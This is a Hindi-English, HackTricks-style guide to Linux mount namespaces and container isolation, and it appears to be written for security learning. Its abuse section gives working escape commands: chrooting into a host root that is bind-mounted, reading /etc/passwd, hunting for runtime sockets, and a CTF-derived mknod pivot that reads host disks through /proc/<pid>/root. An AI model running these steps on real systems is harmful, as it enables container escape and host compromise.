# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

The mount namespace उस **mount table** को नियंत्रित करता है जिसे कोई प्रक्रिया देखती है। यह container isolation की सबसे महत्वपूर्ण विशेषताओं में से एक है क्योंकि root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, और कई runtime-specific helper mounts सब उसी mount table के माध्यम से व्यक्त होते हैं। दो प्रक्रियाएँ दोनों `/`, `/proc`, `/sys`, या `/tmp` को एक्सेस कर सकती हैं, लेकिन ये paths किस चीज़ पर resolve होते हैं यह उस mount namespace पर निर्भर करता है जिसमें वे हैं।

container-security के परिप्रेक्ष्य से, mount namespace अक्सर यह फ़र्क बनता है कि "यह एक अच्छी तरह से तैयार किया गया application filesystem है" या "यह प्रक्रिया सीधे host filesystem को देख या प्रभावित कर सकती है"। इसलिए bind mounts, `hostPath` volumes, privileged mount operations, और writable `/proc` या `/sys` exposures सभी इसी namespace के इर्द-गिर्द घूमते हैं।

## संचालन

जब कोई runtime एक container लॉन्च करता है, तो वह आम तौर पर एक ताज़ा mount namespace बनाता है, container के लिए एक root filesystem तैयार करता है, आवश्यकतानुसार procfs और अन्य helper filesystems mount करता है, और फिर वैकल्पिक रूप से bind mounts, tmpfs mounts, secrets, config maps, या host paths जोड़ता है। एक बार जब वह प्रक्रिया namespace के अंदर चल रही होती है, तो जो mounts वह देखती है वे होस्ट के default view से काफी हद तक अलग हो जाते हैं। होस्ट अभी भी वास्तविक underlying filesystem को देख सकता है, लेकिन container वह संस्करण देखता है जिसे runtime ने उसके लिए assembled किया है।

यह शक्तिशाली है क्योंकि यह container को यह भरोसा दिलाता है कि उसके पास अपना खुद का root filesystem है, जबकि होस्ट अभी भी सब कुछ प्रबंधित कर रहा होता है। यह खतरनाक भी है क्योंकि अगर runtime गलत mount को expose कर दे, तो वह प्रक्रिया अचानक host resources में visibility प्राप्त कर लेती है जिन्हें बाकी security मॉडल ने संरक्षित करने के लिए डिजाइन नहीं किया गया होता।

## प्रयोग

You can create a private mount namespace with:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
अगर आप उस namespace के बाहर एक और shell खोलकर mount table की जाँच करते हैं, तो आप देखेंगे कि tmpfs mount केवल isolated mount namespace के अंदर मौजूद है। यह एक उपयोगी अभ्यास है क्योंकि यह दिखाता है कि mount isolation कोई सैद्धांतिक बात नहीं है; kernel शाब्दिक रूप से process को एक अलग mount table पेश कर रहा है।

अगर आप उस namespace के बाहर एक और shell खोलकर mount table की जाँच करते हैं, तो tmpfs mount केवल isolated mount namespace के अंदर ही मौजूद होगा।

Inside containers, एक त्वरित तुलना यह है:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
दूसरा उदाहरण यह दर्शाता है कि किस तरह एक runtime configuration filesystem boundary के माध्यम से एक बड़ा छेद करना कितना आसान हो सकता है।

## Runtime Usage

Docker, Podman, containerd-based stacks, और CRI-O सभी सामान्य कंटेनरों के लिए एक private mount namespace पर निर्भर करते हैं। Kubernetes इसी मैकेनिज़म के ऊपर volumes, projected secrets, config maps, और `hostPath` mounts के लिए बनता है। Incus/LXC परिवेश भी mount namespaces पर काफी निर्भर करते हैं, खासकर क्योंकि system containers अक्सर application containers की तुलना में अधिक विकसित और machine-like फ़ाइल सिस्टम expose करते हैं।

इसका मतलब यह है कि जब आप किसी container filesystem समस्या की समीक्षा करते हैं, तो आप आम तौर पर किसी अलग-थलग Docker quirk को नहीं देख रहे होते। आप जिस प्लेटफ़ॉर्म ने workload लॉन्च किया है उसके माध्यम से व्यक्त एक mount-namespace और runtime-configuration समस्या देख रहे होते हैं।

## Misconfigurations

सबसे स्पष्ट और खतरनाक गलती host root filesystem या किसी अन्य संवेदनशील host path को bind mount के जरिए expose करना है, उदाहरण के लिए `-v /:/host` या Kubernetes में एक writable `hostPath`। उस बिंदु पर सवाल अब यह नहीं रहता कि "क्या container किसी तरह escape कर सकता है?" बल्कि यह बन जाता है "कितना उपयोगी host कंटेंट पहले से ही सीधे दिखाई दे रहा है और writable है?" एक writable host bind mount अक्सर शेष exploit को file placement, chrooting, config बदलने, या runtime socket खोजने का सरल मामला बना देता है।

एक और सामान्य समस्या host `/proc` या `/sys` को ऐसे तरीकों से expose करना है जो safer container view को बायपास कर दें। ये filesystems सामान्य data mounts नहीं हैं; ये kernel और process state के interfaces हैं। अगर workload सीधे host वर्शन तक पहुँच जाती है, तो container hardening के पीछे कई मान्यताएँ साफ़ सामान रूप से लागू होना बंद कर देती हैं।

Read-only protections matter too. एक read-only root filesystem जादुई रूप से container को सुरक्षित नहीं बनाता, पर यह attacker के staging स्पेस को काफी हद तक हटा देता है और persistence, helper-binary placement, और config छेड़छाड़ को अधिक कठिन बना देता है। इसके विपरीत, एक writable root या writable host bind mount attacker को अगले कदम की तैयारी के लिए जगह देता है।

## Abuse

जब mount namespace का दुरुपयोग होता है, attackers आमतौर पर चार में से किसी एक चीज़ को करते हैं। वे **host data पढ़ते हैं** जिसे container के बाहर रहना चाहिए था। वे **host configuration बदलते हैं** writable bind mounts के जरिए। वे **अतिरिक्त resources mount या remount करते हैं** अगर capabilities और seccomp इसकी अनुमति देते हैं। या वे **शक्तिशाली sockets और runtime state directories तक पहुँचते हैं** जो उन्हें container platform से स्वयं अधिक access माँगने देते हैं।

अगर container पहले से ही host filesystem देख सकता है, तो बाकी security मॉडल तुरंत बदल जाता है।

जब आप host bind mount का संदेह करते हैं, पहले यह पुष्टि करें कि क्या उपलब्ध है और क्या वह writable है:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
यदि host root filesystem को read-write के रूप में mounted किया गया है, तो direct host access अक्सर उतना ही सरल होता है:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
यदि लक्ष्य privileged runtime access है न कि direct chrooting, तो sockets और runtime state को enumerate करें:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो यह भी जाँचें कि क्या container के अंदर से नए mounts बनाए जा सकते हैं:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### पूर्ण उदाहरण: Two-Shell `mknod` Pivot

एक और अधिक विशेषीकृत दुरुपयोग पथ तब प्रकट होता है जब container root user ब्लॉक डिवाइस बना सकता है, host और container किसी उपयोगी तरीके से एक user identity साझा करते हैं, और attacker के पास पहले से ही host पर एक low-privilege foothold मौजूद है। ऐसी स्थिति में, container एक device node जैसे `/dev/sda` बना सकता है, और low-privilege host user बाद में मिलान करने वाले container process के लिए `/proc/<pid>/root/` के माध्यम से इसे पढ़ सकता है।

container के अंदर:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
होस्ट पर, कंटेनर शेल PID का पता लगाने के बाद मेल खाने वाले कम-विशेषाधिकार उपयोगकर्ता के रूप में:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
महत्वपूर्ण सबक सटीक CTF string search नहीं है। इसका मतलब यह है कि mount-namespace के माध्यम से `/proc/<pid>/root/` का प्रकटीकरण हो सकता है, जो host user को container-created device nodes को पुन: उपयोग करने की अनुमति दे सकता है, भले ही cgroup device policy ने container के अंदर सीधे उपयोग को रोका हो।

## जाँच

ये कमांड्स आपको उस filesystem view को दिखाने के लिए हैं जिसमें वर्तमान process वास्तव में चल रहा है। उद्देश्य host-derived mounts, writable sensitive paths, और किसी भी चीज़ का पता लगाना है जो सामान्य application container root filesystem से अधिक व्यापक दिखती हो।
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Host से आने वाले Bind mounts, खासकर `/`, `/proc`, `/sys`, runtime state directories, या socket locations तुरंत ही स्पष्ट दिखने चाहिए।
- अनपेक्षित read-write mounts आमतौर पर read-only helper mounts की बड़ी संख्या की तुलना में अधिक महत्वपूर्ण होते हैं।
- `mountinfo` अक्सर यह देखने के लिए सबसे अच्छा स्थान होता है कि कोई path वास्तव में host-derived है या overlay-backed।

ये जाँच निर्धारित करती हैं कि **which resources are visible in this namespace**, **which ones are host-derived**, और **which of them are writable or security-sensitive**।
